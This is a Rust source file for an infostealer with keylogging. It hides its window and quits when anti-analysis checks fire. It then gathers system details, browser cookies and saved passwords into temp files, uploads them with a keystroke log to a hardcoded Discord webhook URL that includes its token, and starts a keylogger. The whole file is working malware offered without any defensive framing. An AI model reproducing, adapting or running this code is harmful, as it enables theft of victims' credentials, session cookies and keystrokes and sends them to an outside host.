#![windows_subsystem = "windows"]

use anyhow::Result; 
use keylogger::keylog_all;
use serenity::{http::Http, model::{channel::{Embed,AttachmentType},webhook::Webhook}};
use sysinfo::{System, SystemExt};
use std::{process, env, fs, path::PathBuf};
mod cookies;
mod anti_analysis;
mod keylogger;
mod utils;

#[tokio::main]
async fn main(){
    
    if anti_analysis::detected(){
        println!("Seppuku!");
        process::exit(0);
    }

    let sys = System::new_all();
    let mut sysinfo = String::new();
    sysinfo.push_str(&format!("Username:                {}\n", env::var_os("USERNAME").unwrap().into_string().unwrap()));
    sysinfo.push_str(&format!("System name:             {}\n", unwrap_string(sys.name())));
    sysinfo.push_str(&format!("System OS version:       {}\n", unwrap_string(sys.os_version())));
    sysinfo.push_str(&format!("System host name:        {}\n", unwrap_string(sys.host_name())));

    let cookies_file = env::temp_dir().join("cookies.txt");
    let cookies_strings = cookies::get_cookies().unwrap();
    fs::write(&cookies_file, cookies_strings.join("\n")).unwrap();

    let passwords_file = env::temp_dir().join("passwords.txt");
    let passwords_strings = cookies::get_passwords().unwrap();
    fs::write(&passwords_file, passwords_strings.join("\n")).unwrap();

    let mut logs = PathBuf::new();
    logs.push("logs.txt");

    send(sysinfo, cookies_file, passwords_file, logs).await;
    keylog_all();

}

fn unwrap_string(info: Option<String>) -> String{
    match info {
        Some(s) => s,
        None => "?".to_string(),
    }
}

async fn send(data: String, file: PathBuf, file2: PathBuf, file3: PathBuf) -> Result<()>{
    let http = Http::new("token");

    let url = "https://discord.com/api/webhooks/1105833038648189028/bxqCh8d4ptvleFfvZyRz80Wtf161_-KDBoGbPXeYEo-4UJOI5cUEbQS156GSX419JM6u";
    let webhook = Webhook::from_url(&http, url).await?;

    let embed = Embed::fake(|e| {
    e.title("System info");
    e.description(
        data,
    );
    e
});
    webhook
        .execute(&http, true, |w| {
            w.content("content")
                .username("username")
                .embeds(vec![embed])
                .add_file(AttachmentType::Path(&file))
                .add_file(AttachmentType::Path(&file2));
                if file3.exists() { w.add_file(AttachmentType::Path(&file3)); }
                w
        })
        .await?;
    Ok(())
}
